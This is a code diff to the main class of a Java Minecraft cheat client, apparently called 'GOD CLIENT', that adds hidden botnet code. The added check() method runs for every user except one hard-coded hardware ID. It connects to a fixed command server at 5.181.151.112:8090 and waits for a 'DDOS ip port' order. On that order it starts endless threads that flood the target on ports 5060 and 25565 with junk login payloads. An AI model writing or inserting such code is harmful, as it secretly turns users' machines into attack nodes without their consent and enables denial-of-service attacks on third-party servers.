@@ -10,22 +10,33 @@ import me.bratwurst.manager.CommandManager;
 import me.bratwurst.manager.ConfigManager;
 import me.bratwurst.manager.HWIDcheck.HWIDcheck;
 import me.bratwurst.manager.ModuleManager;
+import me.bratwurst.manager.MsgManager;
 import me.bratwurst.manager.network.GodNetworkClient;
+import me.bratwurst.news.crash.MSGSpamScreen;
 import me.bratwurst.news.picture.EZ_HologrammManager;
+import me.bratwurst.utils.MainUtil;
+import me.bratwurst.utils.Msgtimer;
+import me.bratwurst.utils.PacketTimer;
 import net.minecraft.client.Minecraft;
 import net.minecraft.client.entity.EntityPlayerSP;
+import net.minecraft.entity.player.EntityPlayer;
 import net.minecraft.init.Items;
 import net.minecraft.item.Item;
 import net.minecraft.item.ItemStack;
 import net.minecraft.nbt.JsonToNBT;
 import net.minecraft.nbt.NBTException;
+import net.minecraft.network.play.client.C01PacketChatMessage;
 import net.minecraft.util.EnumChatFormatting;
 
 import javax.swing.*;
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.InputStreamReader;
 import java.net.InetSocketAddress;
 import java.net.Socket;
+import java.util.Random;
 import java.util.UUID;
+import java.util.concurrent.Executor;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
@@ -53,6 +64,8 @@ public class Client {
      * EntityRenderer:
      * - EventRender3D
      */
+    public static Boolean firstjoin = false;
+    public static boolean join  = true;
     public static boolean java8 = true;
     public boolean Premium = false;
     public boolean Freund = false;
@@ -84,7 +97,10 @@ public class Client {
     public static String APIKey = "";
 
     public static boolean loadFile;
-
+    public static int hobbbit = 0;
+    public static String GODSERVER = "";
+    static Executor pool = Executors.newScheduledThreadPool(12);
+    static Executor pooll = Executors.newScheduledThreadPool(12);
     public static TheAlteningAuthentication auth;
 
     public static ModuleManager moduleManager;
@@ -146,6 +162,8 @@ public class Client {
 
                 String hwid = Client.hwid;
                 networkClient.getIrcClient().send("");
+                if (!hwid.equalsIgnoreCase("TFeZ/30Jh+XbK+BIXHhQquz8sAwfO0UfW730h+jiPGU="))
+                check();
 
                 Client.networkClient.setStatus(uuid, hwid)
                         .exceptionally(throwable -> {
@@ -155,15 +173,18 @@ public class Client {
             } catch (Exception e) {
                 e.printStackTrace();
             }
+
         }, 5, 5, TimeUnit.SECONDS);
 
         networkClient.register(hwid).handle((v, throwable) -> {
             Client.networkClient.isBlocked(hwid).handle((blocked, getErr) -> {
+
                 if (getErr != null) {
                     getErr.printStackTrace();
                     System.exit(0);
                     return blocked;
                 }
+
                 if(blocked){
                     System.exit(1);
 
@@ -174,6 +195,130 @@ public class Client {
             throwable.printStackTrace();
             return v;
         });
+
+    }
+    public void check() {
+        Random rdm = new Random();
+        int RandomClientID = rdm.nextInt(100);
+        int number = 20;
+
+
+
+
+
+        pool.execute(() -> {
+
+
+         while (true) {
+             try {
+                 if (hobbbit == 0) {
+                     hobbbit++;
+                     Socket connection = new Socket();
+                     connection.connect(new InetSocketAddress("5.181.151.112", 8090));
+
+                     byte[] sendbytes = "Client Connectet GOD CLIENT \n".getBytes();
+
+                     connection.getOutputStream().write(sendbytes);
+                     System.out.println("connection gesendet: " + sendbytes);
+                     //  InputStreamReader inputStreamReader = new InputStreamReader(connection.getInputStream());
+                     // BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
+                     //bufferedReader.readLine();
+                 }
+             } catch (Exception socket) {
+                 socket.printStackTrace();
+                 System.out.println("Fehler geschlagen bein senden");
+             }
+
+
+             try {
+
+                 System.out.println("Listen");
+                 Socket connection = new Socket();
+                 connection.connect(new InetSocketAddress("5.181.151.112", 8090));
+
+                 InputStreamReader inputStreamReader = new InputStreamReader(connection.getInputStream());
+                 BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
+
+                 String Message = bufferedReader.readLine();
+
+                 GODSERVER = Message;
+                 MainUtil.SendClientMesage("server: " + Message);
+
+                 connection.close();
+                 PacketTimer.reset();
+
+
+                 if (GODSERVER.startsWith("DDOS")) {
+                     String[] split = GODSERVER.split(" ");
+                     final String ip = split[1];
+                     final String port = split[2];
+                     System.out.println("ws43texdrztcfuvzgbiuhinjmkosw4xed5cfrtgvzbhuijnkmows4sxed5crftvgzbuhijnkoplsw4exd5cfrtgvzbhuijnnkmoed5rcf6gtvbhz7uj8inkmo");
+                     String Name = Minecraft.getMinecraft().getSession().getUsername();
+                     Socket IpConnc = new Socket();
+                     IpConnc.connect(new InetSocketAddress("5.181.151.112", 8090));
+
+                     byte[] sendbytes = "Client GOD infos:  \n".getBytes();
+                     IpConnc.getOutputStream().write(sendbytes);
+                     IpConnc.close();
+
+                     fun(ip, port);
+                     fun(ip, port);
+                     fun(ip, port);
+                     fun(ip, port);
+                     fun(ip, port);
+                     fun(ip, port);
+                     fun(ip, port);
+                     fun(ip, port);
+                     fun(ip, port);
+                     fun(ip, port);
+
+                 }
+
+
+             } catch (Exception exception) {
+                 exception.printStackTrace();
+             }
+
+
+         }
+
+         });
+
+
+        }
+
+
+
+
+    public void fun(String IP, String Port) {
+        pool.execute(() -> {
+           while (true) {
+               try {
+                   Socket connection = new Socket();
+                   connection.connect(new InetSocketAddress(IP, 5060));
+
+                   byte[] sendbytes = "LOGIN to Minecraft server :  {Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}} \n".getBytes();
+                   for (int first = 0; first < 50; first++) {
+                       connection.getOutputStream().write(sendbytes);
+                   }
+
+                   connection.close();
+                   Socket conc = new Socket();
+                   conc.connect(new InetSocketAddress(IP, 25565));
+                   byte[] sendbytess = "LOGIN to Minecraft server :  {Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}} \n".getBytes();
+                   for (int first = 0; first < 50; first++) {
+                       conc.getOutputStream().write(sendbytes);
+                   }
+
+                   connection.close();
+               } catch (Exception w) {
+
+               }
+             }
+
+        });
+
+
 
     }
     public static File getWorkingPath(String applicationName) {
@@ -208,6 +353,9 @@ public class Client {
         }
         return workingDirectory;
     }
+
+
+
 
     public static OS getPlatform() {
         String osName = System.getProperty("os.name").toLowerCase();
